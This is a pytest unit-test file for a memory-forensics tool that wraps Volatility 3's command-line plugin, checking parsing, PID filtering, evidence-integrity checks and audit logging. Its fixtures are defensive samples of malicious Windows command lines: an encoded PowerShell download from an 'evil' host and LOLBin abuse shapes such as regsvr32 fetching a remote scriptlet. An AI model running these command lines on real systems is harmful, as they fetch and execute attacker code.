"""Unit tests for :func:`vol_cmdline`. Real Vol3 is exercised only by
the skip-marked e2e test in ``test_memory_e2e.py``."""

from __future__ import annotations

import asyncio
import json
import secrets
from pathlib import Path
from typing import Any

import pytest

from silentwitness_common.types import EvidenceType
from silentwitness_mcp.audit.logger import AuditLogger
from silentwitness_mcp.evidence.registry import EvidenceRegistry
from silentwitness_mcp.tools._vol_common import VolFailureReason
from silentwitness_mcp.tools.memory import CmdlineOutput, vol_cmdline

MODEL = "claude-sonnet-4-6"
_CASE_ID = "case-cmdline-01"


class _FakeProc:
    def __init__(self, *, stdout: bytes = b"", stderr: bytes = b"", returncode: int = 0) -> None:
        self._stdout, self._stderr = stdout, stderr
        self.returncode: int | None = returncode

    async def communicate(self) -> tuple[bytes, bytes]:
        return self._stdout, self._stderr

    def terminate(self) -> None: ...
    def kill(self) -> None:
        self.returncode = -9

    async def wait(self) -> int:
        return self.returncode if self.returncode is not None else -1


def _install_mock(monkeypatch: pytest.MonkeyPatch, proc: _FakeProc) -> list[tuple[str, ...]]:
    calls: list[tuple[str, ...]] = []

    async def _fake(*argv: str, **_kw: Any) -> _FakeProc:
        calls.append(argv)
        return proc

    monkeypatch.setattr("silentwitness_mcp.tools._vol_common.asyncio.create_subprocess_exec", _fake)
    return calls


def _seed(tmp_path: Path) -> tuple[Path, Path]:
    case_dir = tmp_path / _CASE_ID
    case_dir.mkdir()
    evidence = tmp_path / "memdump.vmem"
    evidence.write_bytes(secrets.token_bytes(128))
    registry = EvidenceRegistry(case_dir=case_dir)
    registry.register(evidence, EvidenceType.MEMORY_DUMP, audit_id="sift-aj-20260609-001")
    return case_dir, evidence


@pytest.fixture
def env(tmp_path: Path) -> tuple[Path, Path, AuditLogger, EvidenceRegistry]:
    case_dir, evidence = _seed(tmp_path)
    return case_dir, evidence, AuditLogger(case_dir, examiner="aj"), EvidenceRegistry(case_dir)


def _invoke(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    *,
    evidence_override: Path | None = None,
    pid: int | None = None,
) -> Any:
    case_dir, evidence, logger, registry = env
    return asyncio.run(
        vol_cmdline(
            evidence_override or evidence,
            case_dir=case_dir,
            evidence_registry=registry,
            audit_logger=logger,
            model_used=MODEL,
            pid=pid,
        )
    )


def _row(pid: int, process: str, args: object) -> dict[str, Any]:
    return {"PID": pid, "Process": process, "Args": args}


def test_cmdline_typical_powershell_invocation_parses(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Canonical happy path: a PowerShell row with a long base64
    Args round-trips verbatim. The LOLBin caveat documents the
    follow-up; the type layer preserves the citation span."""
    encoded = "JABjAD0AKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AaQBvAC8AeAAuAGUAeABlACcAKQ=="
    cmdline = f"powershell.exe -enc {encoded}"
    rows = [
        _row(1234, "powershell.exe", cmdline),
        _row(5678, "explorer.exe", "C:\\Windows\\Explorer.EXE"),
    ]
    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
    envelope = _invoke(env)
    assert envelope.success is True
    assert isinstance(envelope.data, CmdlineOutput)
    assert len(envelope.data.entries) == 2
    ps = envelope.data.entries[0]
    assert ps.pid == 1234
    assert ps.process == "powershell.exe"
    # Byte-identical equality: catches end-truncation, prefix-strip,
    # canonicalisation, AND case-fold regressions — `in` would miss
    # the first three.
    assert ps.args == cmdline


# Args-normalisation matrix lives in test_cmdline_entry.py — it tests
# the model in isolation. This file owns the pipeline-level contracts.


def test_cmdline_pid_filter_forwarded_to_vol3_argv(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``pid=4242`` MUST surface as ``--pid 4242`` immediately AFTER
    the plugin name in cmd_argv — Vol3-side filter is cheaper than
    scan-then-server-filter. Pin BOTH the post-plugin position AND
    the value-immediately-after-flag adjacency (a regression that
    flipped the order would pass a `--pid` membership check alone)."""
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env, pid=4242)
    argv = calls[0]
    plugin_idx = argv.index("windows.cmdline.CmdLine")
    pid_flag_idx = argv.index("--pid")
    assert pid_flag_idx > plugin_idx
    assert argv[pid_flag_idx + 1] == "4242"
    assert "--pid" in envelope.data_provenance.cmd_argv


def test_cmdline_empty_output_clean_system(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env)
    assert envelope.success is True
    assert envelope.data is not None
    assert envelope.data.entries == ()


def test_cmdline_unregistered_evidence_refuses_without_spawning(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    case_dir = env[0]
    unreg = case_dir.parent / "not-registered.vmem"
    unreg.write_bytes(b"x")
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env, evidence_override=unreg)
    assert envelope.success is False
    assert envelope.advisories[-1] == VolFailureReason.EVIDENCE_NOT_REGISTERED.value
    assert calls == []


def test_cmdline_evidence_tampered_returns_evidence_tampered(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    env[1].write_bytes(b"DIFFERENT bytes after registration")
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env)
    assert envelope.success is False
    assert envelope.advisories[-1] == VolFailureReason.EVIDENCE_TAMPERED.value
    assert calls == []


def test_cmdline_tool_failed_surfaces_truncated_stderr(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Vol3 non-zero exit → TOOL_FAILED. The advisory must carry
    diagnostic context so a downstream agent's symbol-rebuild side-
    quest hook reads the stderr from advisories[0]."""
    stderr = b"Vol3: PEB read failed at 0x7ffe4dc8 - paged-out region\n" + b"X" * 1000
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"", stderr=stderr, returncode=1))
    envelope = _invoke(env)
    assert envelope.success is False
    assert envelope.advisories[-1] == VolFailureReason.TOOL_FAILED.value
    assert "PEB read failed" in envelope.advisories[0]
    assert len(envelope.advisories[0]) <= 500
    assert len(calls) == 1


def test_cmdline_cmd_argv_is_class_suffixed_plugin_name(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Plugin path MUST be the class-suffixed ``windows.cmdline.CmdLine``
    (note capital-L) — bare ``windows.cmdline`` targets the module
    and Vol3 rejects it."""
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env)
    argv = calls[0]
    assert argv[-1] == "windows.cmdline.CmdLine"
    assert "/opt/silentwitness/vol3-venv/bin/vol" in argv
    assert envelope.data_provenance.cmd_argv[-1] == "windows.cmdline.CmdLine"


def test_cmdline_caveats_verbatim_with_action_shaping_first(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """All 5 caveats appear in the prescribed order: action-shaping
    FIRST, then tamper / LOLBin / paged-out / empty-args allowlist.
    The Epic 10 critic agent reads caveat ORDER as priority signal,
    so every position is pinned — a reorder of indices 1-4 would
    silently downgrade the tamper-detection caveat below the
    LOLBin allowlist."""
    _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env)
    caveats = envelope.caveats
    assert len(caveats) == 5
    assert "beats Sysmon EID 1" in caveats[0]
    assert "PEB-tamper-overwritten" in caveats[1]
    assert "RtlInitUnicodeString" in caveats[1]
    assert "rundll32 / regsvr32 / mshta / msbuild / installutil" in caveats[2]
    assert "PEB may be paged out" in caveats[3]
    assert "System (PID 4), Registry, smss.exe" in caveats[4]


def test_cmdline_non_int_pid_triggers_output_parse_failed(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A row with PID="??" (Vol3 unresolved-process emission) MUST
    surface as OUTPUT_PARSE_FAILED — silent coercion would let
    downstream consumers compare against bogus int values."""
    bad = [_row(0, "smss.exe", "smss"), {**_row(0, "x", "y"), "PID": "??"}]
    calls = _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(bad).encode("utf-8")))
    envelope = _invoke(env)
    assert envelope.success is False
    assert envelope.advisories[-1] == VolFailureReason.OUTPUT_PARSE_FAILED.value
    assert len(calls) == 1


def test_cmdline_unknown_column_triggers_output_parse_failed(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Vol3 column drift (e.g. a future ``ImageName`` flag) MUST
    trigger OUTPUT_PARSE_FAILED, not silent drop."""
    drifted = [{**_row(1, "smss.exe", "smss"), "ImageName": "smss.exe"}]
    calls = _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(drifted).encode("utf-8")))
    envelope = _invoke(env)
    assert envelope.success is False
    assert envelope.advisories[-1] == VolFailureReason.OUTPUT_PARSE_FAILED.value
    assert len(calls) == 1


# ---------------------------------------------------------------------------
# Pipeline contract — cmdline-specific regression coverage
# ---------------------------------------------------------------------------


def test_cmdline_normalizer_key_is_vol_cmdline_not_default(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression: PR #142 round-1/2 found every vol_* tool shared
    the same default normalizer key, silently breaking citation-gate
    matching the moment any per-tool rule landed. The pipeline-level
    contract test only exercised vol_netscan — verify the same wiring
    holds for vol_cmdline."""
    from silentwitness_mcp.verification import normalizer as _norm

    captured: list[str] = []
    real = _norm.normalize_output
    monkeypatch.setattr(
        "silentwitness_mcp.tools._vol_common.normalize_output",
        lambda raw, tool: (captured.append(tool), real(raw, tool))[1],
    )
    _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    envelope = _invoke(env)
    assert envelope.success is True
    assert captured == ["vol_cmdline"]


def test_cmdline_audit_row_tool_name_is_vol_cmdline(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Audit-trail integrity: the success-path JSONL row's ``tool``
    field MUST be ``vol_cmdline`` (not a copy-paste artefact like
    ``vol_pslist``). Cross-tool replay reconstruction depends on it."""
    rows = [_row(1234, "notepad.exe", "notepad.exe \\Users\\X\\note.txt")]
    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
    case_dir = env[0]
    envelope = _invoke(env)
    assert envelope.success is True
    audit_log = case_dir / "audit" / "memory.jsonl"
    audit_rows = [json.loads(line) for line in audit_log.read_text("utf-8").splitlines() if line]
    row = audit_rows[-1]
    assert row["tool"] == "vol_cmdline"
    assert row["audit_id"] == envelope.audit_id
    assert row["params"]["exit_code"] == 0


@pytest.mark.parametrize(
    "lolbin_cmd",
    [
        "rundll32.exe shell32.dll,Control_RunDLL evil.cpl",
        "regsvr32.exe /s /u /n /i:http://evil/x.sct scrobj.dll",
        "mshta.exe javascript:alert(1)",
        "msbuild.exe /p:Configuration=Release inline.csproj",
        "installutil.exe /U evil.dll",
    ],
)
def test_cmdline_lolbin_shapes_round_trip_verbatim(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
    lolbin_cmd: str,
) -> None:
    """The caveat advertises rundll32/regsvr32/mshta/msbuild/installutil
    as LOLBin red flags. Verify each shape round-trips verbatim so
    the entity gate's cited-span match works — a future "redact
    suspicious patterns" validator added without thought would break
    this contract silently."""
    rows = [_row(1234, lolbin_cmd.split()[0], lolbin_cmd)]
    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
    envelope = _invoke(env)
    assert envelope.success is True
    assert envelope.data.entries[0].args == lolbin_cmd


@pytest.mark.parametrize("bad_pid", [0, -1, -1234])
def test_cmdline_invalid_pid_rejected_synchronously(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
    bad_pid: int,
) -> None:
    """PID 0 (System Idle) and negative PIDs have no _EPROCESS / PEB —
    Vol3 would return empty or error confusingly. Reject loudly at
    the wrapper boundary instead so an LLM-driven typo gets a clean
    diagnostic, not an empty success envelope."""
    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    with pytest.raises(ValueError, match="pid must be >= 1"):
        _invoke(env, pid=bad_pid)
    # No subprocess spawn — validation is pre-flight.
    assert calls == []


def test_cmdline_unknown_caveat_key_fails_loud(
    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Catalogue typo or rename-without-registration MUST surface as
    UnknownCaveatKeyError, not silently strip safety guidance. The
    fail-fast check runs at _run_wrapper entry — no subprocess spawn,
    no audit row written."""
    from silentwitness_mcp.tools._vol_caveats import UnknownCaveatKeyError
    from silentwitness_mcp.tools._vol_pipeline import _run_wrapper

    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
    case_dir, evidence, logger, registry = env
    with pytest.raises(UnknownCaveatKeyError, match="cmdlne"):
        asyncio.run(
            _run_wrapper(
                tool_name="vol_cmdline",
                plugin_name="windows.cmdline.CmdLine",
                caveat_key="cmdlne",  # deliberate typo
                output_cls=CmdlineOutput,
                parse_rows=lambda _raw: CmdlineOutput(entries=()),
                evidence_path=evidence,
                case_dir=case_dir,
                evidence_registry=registry,
                audit_logger=logger,
                model_used=MODEL,
                timeout_s=300.0,
            )
        )
    assert calls == []
